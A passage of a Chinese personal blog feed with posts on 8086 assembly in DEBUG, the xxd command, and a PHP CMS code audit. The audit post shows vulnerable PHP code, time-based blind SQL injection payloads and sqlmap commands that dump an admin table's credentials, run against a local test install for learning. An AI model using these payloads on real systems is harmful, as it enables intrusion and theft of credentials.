1000:0 处的值</p><p><img src= "/img/loading.gif" data-src="/posts/6cc1a5d6/1580653258074.png" alt></p><p>将指令书写到内存中，也就是设置 3000:0 为代码段</p><p><img src= "/img/loading.gif" data-src="/posts/6cc1a5d6/1580653266322.png" alt></p><p>在实验的时候，前面一部分数据是可以正常复制的，但是后面就出问题了</p><p><img src= "/img/loading.gif" data-src="/posts/6cc1a5d6/1580653275496.png" alt></p><p>暂时没想清楚</p><h2 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h2><p>遇到的问题</p><p>输入指令：</p><p><img src= "/img/loading.gif" data-src="/posts/6cc1a5d6/1580653286041.png" alt></p><p>但是在执行的时候：</p><p><img src= "/img/loading.gif" data-src="/posts/6cc1a5d6/1580653293057.png" alt></p><p>这是之后要研究的内容；中断机制<br>Debug的T命令在修改寄存器SS的指令时，下一条指令也会紧接着执行</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,ffff</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">2200</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>,<span class="number">0100</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,[<span class="number">0</span>]     <span class="comment">;ax=C0EAH</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">ax</span>,[<span class="number">2</span>]     <span class="comment">;ax=C0FCH</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>,[<span class="number">4</span>]     <span class="comment">;bx=30F</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>,[<span class="number">6</span>]     <span class="comment">;bx=6021H</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ax</span>        <span class="comment">;sp=FEH,修改的内存单元地址是220FEH,内容为C0FCH</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">bx</span>        <span class="comment">;sp=FCH,修改的内存单元地址是220FCH,内容为6021H</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ax</span>   <span class="comment">;sp=FEH,ax=6021H</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">bx</span>   <span class="comment">;sp=100H,bx=C0FCH</span></span><br><span class="line"><span class="keyword">push</span> [<span class="number">4</span>]       <span class="comment">;sp=FEH,修改的内存单元是220FEH,内容为30F0</span></span><br><span class="line"><span class="keyword">push</span> [<span class="number">6</span>]   <span class="comment">;sp=FCH,修改的内存单元是220FCH,内容为2F31</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/6cc1a5d6/1580653302675.png" alt></p><p>为什么2000:0 ~2000:f 的内容会发生变化？</p><p><img src= "/img/loading.gif" data-src="/posts/6cc1a5d6/1580653314559.png" alt></p><p>仔细观察发现<br>01A3 不知道是什么，但是0b39和0108确实当前指令的地址，也就是执行完 <code>mov ss,ax mov sp,10H</code> 之后的下一条指令的地址，结合这是在设置栈，不禁想到了函数的压栈，保存了返回地址，但是还有一个 0020 的数据不知道是哪里的</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土一</title>
      <link href="/posts/57418b7f/"/>
      <url>/posts/57418b7f/</url>
      
        <content type="html"><![CDATA[<h2 id="第一、二章"><a href="#第一、二章" class="headerlink" title="第一、二章"></a>第一、二章</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>一个存储单元一般存储 1个字节，也就是8个二进制位</p><p>一个字为两个字节</p><p>地址总线：用来寻址，由于一根地址总线只能表示2个状态，所以一个CPU有N根地址线，则可以说这个CPU的地址总线宽度为N，这样的CPU最多可以寻找 $2^{N}$ 个内存单元</p><p>数据总线：数据总线的宽度意味着CPU一次能传输多少位数据</p><p>控制总线：控制总线的宽度决定了CPU对外部器件的控制能力</p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>通用寄存器中，AX可以拆分为 AH和AL，如果单独使用AH或者AL，则应该看成一个独立的8位寄存器来使用，AH和AL此时是不相关的</p><p>如何寻址？<br><img src= "/img/loading.gif" data-src="/posts/57418b7f/1580566042011.png" alt></p><p>注意此时并不是操作系统中学到的分段，只是这么用罢了</p><p>一个 ‘段’ 的偏移占16位，那么一个段的长度最大为64KB</p><p>不同的段地址和偏移地址可以形成同一个物理地址</p><p>CS:IP 指向的内容就是将要执行的指令(但是CPU是怎么知道指令的长度的呢，x86是变长的，而MIPS是等长的，这个坑之后说)</p><p>基础指令 mov,add,jmp</p><p>mov指令设置寄存器的内容值，add执行加法，jmp设置cs和ip的值</p><p>四条指令完成计算2的4次方</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">ax</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">ax</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">ax</span>,<span class="built_in">ax</span></span><br></pre></td></tr></table></figure><p>当然也可以使用jmp指令，但是你无法判定程序什么时候退出(因为指令不够hhhh)</p><h2 id="dosbox使用"><a href="#dosbox使用" class="headerlink" title="dosbox使用"></a>dosbox使用</h2><p>dosbox可以用来模拟dos环境，然后我们下载一个MASM工具包，里面包含了 <code>debug</code> 这些程序</p><p>注意设置dosbox</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[autoexec]</span><br><span class="line"># Lines in this section will be run at startup.</span><br><span class="line"># You can put your MOUNT lines here.</span><br><span class="line"></span><br><span class="line">mount C: G:\MASM</span><br><span class="line">C:</span><br></pre></td></tr></table></figure><p>因为我的 MASM 工具包位于 G盘目录下，所以设置挂载命令<br>这样打开dosbox之后自动挂载</p><p><img src= "/img/loading.gif" data-src="/posts/57418b7f/1580565800214.png" alt></p><h2 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h2><p>debug.exe 使用<br>r 命令可以查看寄存器内容，以及当前的 cs:ip 指向，还有ds指向的内容</p><p><img src= "/img/loading.gif" data-src="/posts/57418b7f/1580565809854.png" alt></p><p>还可以修改寄存器的内容</p><p><img src= "/img/loading.gif" data-src="/posts/57418b7f/1580565820000.png" alt></p><p>使用d命令查看内存</p><p><code>d1000:9</code></p><p><img src= "/img/loading.gif" data-src="/posts/57418b7f/1580565830704.png" alt></p><p>查看某一个范围内的内存</p><p><code>d1000:9 20</code></p><p><img src= "/img/loading.gif" data-src="/posts/57418b7f/1580565845701.png" alt></p><p>e 命令可以修改内存的数据</p><p><code>e1000:0 0 1 2 3 4 5 7 8</code></p><p><img src= "/img/loading.gif" data-src="/posts/57418b7f/1580565854260.png" alt></p><p>当然也可以换一种方式修改</p><p><img src= "/img/loading.gif" data-src="/posts/57418b7f/1580565864064.png" alt></p><p>也可以向其中写入字符串</p><p><img src= "/img/loading.gif" data-src="/posts/57418b7f/1580565875753.png" alt></p><p>尝试写入一段汇编指令</p><p><img src= "/img/loading.gif" data-src="/posts/57418b7f/1580565886857.png" alt></p><p>使用 e命令编辑内存，然后使用 u 命令反汇编</p><p><img src= "/img/loading.gif" data-src="/posts/57418b7f/1580565897644.png" alt></p><p>那么如何执行汇编指令呢？</p><p>首先用 r 设置 cs 和 ip的值，然后使用 t 就可以执行汇编指令了，可以看到执行了三条汇编指令后的结果， ax 存储了 0x03   cx 存储了 0x02</p><p><img src= "/img/loading.gif" data-src="/posts/57418b7f/1580565906622.png" alt></p><p>直接使用 e 命令编辑当然不方便，于是可以用 a 命令直接书写汇编指令，然后自动的给转化成对应的机器码</p><p><img src= "/img/loading.gif" data-src="/posts/57418b7f/1580565914978.png" alt></p><h2 id="实验任务"><a href="#实验任务" class="headerlink" title="实验任务"></a>实验任务</h2><ol><li>使用debug将下面的程序写入内存，逐条执行</li></ol><p><img src= "/img/loading.gif" data-src="/posts/57418b7f/1580565925422.png" alt></p><p>汇编指令输入到内存中</p><p><img src= "/img/loading.gif" data-src="/posts/57418b7f/1580565937645.png" alt></p><p>然后运行就是的了</p><ol start="2"><li>将下面3条指令写入到 2000:0 开始的内存单元中，计算2的次方</li></ol><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">ax</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="keyword">jmp</span> <span class="number">2000</span>:<span class="number">0003</span></span><br></pre></td></tr></table></figure><p>运行过程截图</p><p><img src= "/img/loading.gif" data-src="/posts/57418b7f/1580565948449.png" alt></p><ol start="3"><li>PC 机主板上的ROM有一个生产日期，在内存 FFF00H~FFFFFH 的某几个单元中，请找到这个生产日期并试图改变它</li></ol><p><img src= "/img/loading.gif" data-src="/posts/57418b7f/1580565963720.png" alt></p><p>很显然我是改不了的</p><p><img src= "/img/loading.gif" data-src="/posts/57418b7f/1580565972814.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
            <tag> dosbox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计初尝</title>
      <link href="/posts/728b20a1/"/>
      <url>/posts/728b20a1/</url>
      
        <content type="html"><![CDATA[<h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>文件删除函数只考虑到了白名单路径，但是没有想到 <code>../</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">del_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$path = post(<span class="string">'path'</span>);</span><br><span class="line">$path = str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</span><br><span class="line">$dir[<span class="number">0</span>] = <span class="string">'data/backup/'</span>;</span><br><span class="line">$dir[<span class="number">1</span>] = <span class="string">'images/'</span>;</span><br><span class="line">$dir[<span class="number">2</span>] = <span class="string">'resource/'</span>;</span><br><span class="line">$flag = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($dir); $i ++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(substr($path,<span class="number">0</span>,strlen($dir[$i])) == $dir[$i])</span><br><span class="line">&#123;</span><br><span class="line">$flag = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(unlink($path))</span><br><span class="line">&#123;</span><br><span class="line">$result = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>($result) ? $result : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根目录新建 aaaa.txt<br>然后发送请求<br><img src= "/img/loading.gif" data-src="/posts/728b20a1/1580563907589.png" alt></p><p>成功删除文件</p><h2 id="后台注入"><a href="#后台注入" class="headerlink" title="后台注入"></a>后台注入</h2><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p><code>or if(length(database())=6,sleep(3),0)</code><br>如果数据库名的长度为6，那么就 <code>sleep(3)</code><br>我测试的时候数据库名为 <code>xinxiu</code> ，所以就会出现一定的延时</p><p><img src= "/img/loading.gif" data-src="/posts/728b20a1/1580563920089.png" alt></p><p>延时注入的其他例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 判断当前数据库长度 # 当前数据库长度是否为 1 没有延时 不是 </span><br><span class="line">cmd&#x3D;del_admin&amp;id&#x3D;3 or if(length(database())&#x3D;1,sleep(3),0) </span><br><span class="line"># 延时 表明当前数据库长度为 6 </span><br><span class="line">cmd&#x3D;del_admin&amp;id&#x3D;3 or if(length(database())&#x3D;6,sleep(3),0) </span><br><span class="line"># 当前数据库第1个字母的ascii码是否为 97 没有延时 不是 </span><br><span class="line">cmd&#x3D;del_admin&amp;id&#x3D;3 or if(ascii(mid(database(),1,1))&#x3D;97,sleep(3),0) </span><br><span class="line"># 延时 表明当前数据库第1个字母的ascii码为 115 即 &#39;s&#39; </span><br><span class="line">cmd&#x3D;del_admin&amp;id&#x3D;3 or if(ascii(mid(database(),1,1))&#x3D;115,sleep(3),0) </span><br><span class="line"># 当前数据库第2个字母的ascii码是否为 97 没有延时 不是 </span><br><span class="line">cmd&#x3D;del_admin&amp;id&#x3D;3 or if(ascii(mid(database(),2,1))&#x3D;97,sleep(3),0) </span><br><span class="line"># 延时 表明当前数据库第2个字母的ascii码为 105 即 &#39;i&#39; </span><br><span class="line">cmd&#x3D;del_admin&amp;id&#x3D;3 or if(ascii(mid(database(),2,1))&#x3D;105,sleep(3),0) ...</span><br></pre></td></tr></table></figure><p>注意这里不能用 and ,因为这个 id=3 的用户实际上不存在，所以就不再需要去执行 and 另一边的语句了(短路！)</p><p>但是如果这个用户存在当然是可以的咯(那样注入就很麻烦了)</p><p><img src= "/img/loading.gif" data-src="/posts/728b20a1/1580563976163.png" alt></p><p>但是我按照国光的方法使用 sqlmap 失败了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php?&#x2F;deal&#x2F;dir-basic&#x2F;&quot; --cookie&#x3D;&quot;qaq21129s234bj1q4ammcs7fe5;&quot; --data&#x3D;&quot;cmd&#x3D;del_admin&amp;id&#x3D;3&quot; -p &quot;id&quot; --technique&#x3D;T --random-agent -v 3 --tamper&#x3D;&quot;between&quot; -D &#39;sinsiu&#39; -T &#39;php_admin&#39; -C &#39;adm_id,adm_username,adm_password&#39; --dump</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/728b20a1/1580563990735.png" alt></p><h3 id="另一处后台注入"><a href="#另一处后台注入" class="headerlink" title="另一处后台注入"></a>另一处后台注入</h3><p><code>search_main.php</code> 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$global[<span class="string">'key'</span>] = rawurldecode($global[<span class="string">'key'</span>]);</span><br><span class="line">$obj = <span class="keyword">new</span> goods();</span><br><span class="line">$obj-&gt;set_field(<span class="string">'goo_id,goo_title,goo_x_img'</span>);</span><br><span class="line">$obj-&gt;set_where(<span class="string">"goo_title like '%"</span> . $global[<span class="string">'key'</span>] . <span class="string">"%'"</span>);</span><br><span class="line">$obj-&gt;set_where(<span class="string">'goo_channel_id = '</span>.get_id(<span class="string">'channel'</span>,<span class="string">'cha_code'</span>,<span class="string">'goods'</span>));</span><br></pre></td></tr></table></figure><p>这里忘记过滤了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$obj-&gt;set_where(<span class="string">"goo_title like '%"</span> . $global[<span class="string">'key'</span>] . <span class="string">"%'"</span>);</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/728b20a1/1580564002356.png" alt></p><p>同样的尝试使用 <code>sqlmap</code> 但是还是失败了(怕是个假的吧)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;?&#x2F;search&#x2F;index.html&#x2F;key-%27*%20%23&#x2F;&quot; -v 3 --technique&#x3D;T -D &#39;sinsiu&#39; -T &#39;php_admin&#39; -C &#39;adm_id,adm_username,adm_password&#39; --dump</span><br></pre></td></tr></table></figure><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><code>admin/basic_func.php</code> 中：</p><p><code>$global[&#39;channel&#39;]</code> 参数可控，比如访问 <code>/admin.php?/service/mod-user_sheet/</code>,那么获取到的是 <code>service</code> ，之后判断文件是否存在进行包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span> $global;</span><br><span class="line">$global = <span class="keyword">array</span>();</span><br><span class="line">var_dump($_SERVER[<span class="string">'QUERY_STRING'</span>]);</span><br><span class="line">$global[<span class="string">'url'</span>] = $filter($_SERVER[<span class="string">'QUERY_STRING'</span>]);</span><br><span class="line"><span class="keyword">if</span>($global[<span class="string">'url'</span>] != <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line">$arr = explode(<span class="string">'/'</span>,$global[<span class="string">'url'</span>]); <span class="comment">//以 / 做分隔符</span></span><br><span class="line">$global[<span class="string">'channel'</span>] = $arr[<span class="number">1</span>];</span><br><span class="line">var_dump($global);</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/728b20a1/1580564015011.png" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $global,$smarty;</span><br><span class="line">set_global();</span><br><span class="line">include_all(<span class="string">'admin/class'</span>);</span><br><span class="line">set_more_global();</span><br><span class="line">$path = <span class="string">'admin/admin.php'</span>;</span><br><span class="line"><span class="keyword">if</span>($global[<span class="string">'url'</span>] != <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line">$path2 = <span class="string">'admin/'</span>.$global[<span class="string">'channel'</span>].<span class="string">'.php'</span>; <span class="comment">//获取到 $global['channel'] 这个参数可控</span></span><br><span class="line">var_dump(file_exists($path2));</span><br><span class="line"><span class="keyword">if</span>(file_exists($path2))</span><br><span class="line">&#123;</span><br><span class="line">$path = $path2;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($path);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这里如果传入 <code>../</code> 那么就会导致 <code>file_exists</code> 返回错误，所以暂时无能为力</p><p><code>admin/common.func.php</code> 文件中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">($parameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $smarty;</span><br><span class="line">$path = <span class="string">''</span>;</span><br><span class="line">$display = <span class="string">''</span>;</span><br><span class="line">extract($parameter); <span class="comment">//extract函数存在变量覆盖，但是参数不可控</span></span><br><span class="line">$func = <span class="string">'module_'</span>.$module;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'admin/module/'</span>.$path.$module.<span class="string">'.php'</span>);</span><br><span class="line">$func($parameter);</span><br><span class="line"><span class="keyword">if</span>($display != <span class="string">'no'</span>)</span><br><span class="line">&#123;</span><br><span class="line">$smarty-&gt;display(<span class="string">'module/'</span>.$path.$module.<span class="string">'.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="任意写文件"><a href="#任意写文件" class="headerlink" title="任意写文件"></a>任意写文件</h2><p><code>common.func.php</code> 存在一处编辑配置文件</p><p><img src= "/img/loading.gif" data-src="/posts/728b20a1/1580564028890.png" alt></p><p>当然此处是可以随意修改文件的，只是没办法写shell</p><p><img src= "/img/loading.gif" data-src="/posts/728b20a1/1580564041634.png" alt></p><p>可见过滤还是挺严格的</p><p><img src= "/img/loading.gif" data-src="/posts/728b20a1/1580564050184.png" alt></p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><code>getRemoteImage.php</code> 文件中，</p><p>可以获取远程图片</p><p>首先必须是 http开头的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strpos($imgUrl,<span class="string">"http"</span>)!==<span class="number">0</span>)&#123;</span><br><span class="line">                array_push( $tmpNames , <span class="string">"error"</span> );</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>校验了后缀名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$fileType = strtolower( strrchr( $imgUrl , <span class="string">'.'</span> ) );</span><br><span class="line"><span class="keyword">if</span> ( !in_array( $fileType , $config[ <span class="string">'allowFiles'</span> ] ) || stristr( $heads[ <span class="string">'Content-Type'</span> ] , <span class="string">"image"</span> ) ) &#123;</span><br><span class="line">    array_push( $tmpNames , <span class="string">"error"</span> );</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相关的白名单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$config = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"savePath"</span> =&gt; <span class="string">"../../images/editor/"</span> ,            <span class="comment">//保存路径</span></span><br><span class="line">    <span class="string">"allowFiles"</span> =&gt; <span class="keyword">array</span>( <span class="string">".gif"</span> , <span class="string">".png"</span> , <span class="string">".jpg"</span> , <span class="string">".jpeg"</span> , <span class="string">".bmp"</span> ) , <span class="comment">//文件允许格式</span></span><br><span class="line">    <span class="string">"maxSize"</span> =&gt; <span class="number">30000</span>                    <span class="comment">//文件大小限制，单位KB</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>之后会读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile( $imgUrl,<span class="keyword">false</span>,$context);</span><br></pre></td></tr></table></figure><p>这么看来感觉问题不大</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-21" target="_blank" rel="noopener">PHP代码审计初尝</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-xxd</title>
      <link href="/posts/2e8d4a2a/"/>
      <url>/posts/2e8d4a2a/</url>
      
        <content type="html"><![CDATA[<h2 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h2><p>基本选项</p><ul><li>-a : 它的作用是自动跳过空白内容，默认是关闭的</li><li>-c : 它的后面加上数字表示每行显示多少字节的十六进制数，默认是16字节。</li><li>-g : 设定以几个字节为一块，默认为2字节。</li><li>-l : 显示多少字节的内容。</li><li>-s : 后面接【+-】和address.加号表示从地址处开始的内容，减号表示距末尾address开始的内容。</li><li>-ps: output in postscript plain hexdump style</li></ul><p>xxd 是有单位的，如</p><p><img src= "/img/loading.gif" data-src="/posts/2e8d4a2a/1580557821863.png" alt></p><p>和</p><p><img src= "/img/loading.gif" data-src="/posts/2e8d4a2a/1580557833258.png" alt></p><p>很显然其中一个 0x100 是 256个字节，也就是16行咯</p><h3 id="g-选项的含义"><a href="#g-选项的含义" class="headerlink" title="-g 选项的含义"></a>-g 选项的含义</h3><p>默认是两个字节一组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ xxd -s -100 -l 0x20 monster.jpg</span><br><span class="line">00002601: eeae ee33 b2ae ae9b b979 0eb8 e171 a040  ...3.....y...q.@</span><br><span class="line">00002611: 2146 78f7 d5a0 fef0 79e7 5135 fbf5 7f48  !Fx.....y.Q5...H</span><br></pre></td></tr></table></figure><p>通过 -g 变为一个字节一组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ xxd -s -100 -l 0x20  -g 1 monster.jpg </span><br><span class="line">00002601: ee ae ee 33 b2 ae ae 9b b9 79 0e b8 e1 71 a0 40  ...3.....y...q.@</span><br><span class="line">00002611: 21 46 78 f7 d5 a0 fe f0 79 e7 51 35 fb f5 7f 48  !Fx.....y.Q5...H</span><br></pre></td></tr></table></figure><h2 id="其他用法"><a href="#其他用法" class="headerlink" title="其他用法"></a>其他用法</h2><p>如果我只想要十六进制,加上 -ps 选项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ xxd -s -100 -l 0x20  -g 1  -ps monster.jpg </span><br><span class="line">eeaeee33b2aeae9bb9790eb8e171a040214678f7d5a0fef079e75135fbf5</span><br><span class="line">7f48</span><br></pre></td></tr></table></figure><p>​    可以输出C语言数组形式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ xxd -s -100 -l 0x20  -g 1 -i  monster.jpg </span><br><span class="line">unsigned char monster_jpg[] = &#123;</span><br><span class="line">  0xee, 0xae, 0xee, 0x33, 0xb2, 0xae, 0xae, 0x9b, 0xb9, 0x79, 0x0e, 0xb8,</span><br><span class="line">  0xe1, 0x71, 0xa0, 0x40, 0x21, 0x46, 0x78, 0xf7, 0xd5, 0xa0, 0xfe, 0xf0,</span><br><span class="line">  0x79, 0xe7, 0x51, 0x35, 0xfb, 0xf5, 0x7f, 0x48</span><br><span class="line">&#125;;</span><br><span class="line">unsigned int monster_jpg_len = 32;</span><br></pre></td></tr></table></figure><h2 id="与vim结合"><a href="#与vim结合" class="headerlink" title="与vim结合"></a>与vim结合</h2><p><code>vim 文件名 -b</code> 以二进制方式打开文件</p><p>然后输入命令 <code>%!xxd</code></p><p>就可以进入到十六进制编辑模式</p><p>编辑完之后需要用 <code>%!xxd -r</code> 保存，退回到原来的vim模式</p><h2 id="反向dump"><a href="#反向dump" class="headerlink" title="反向dump"></a>反向dump</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 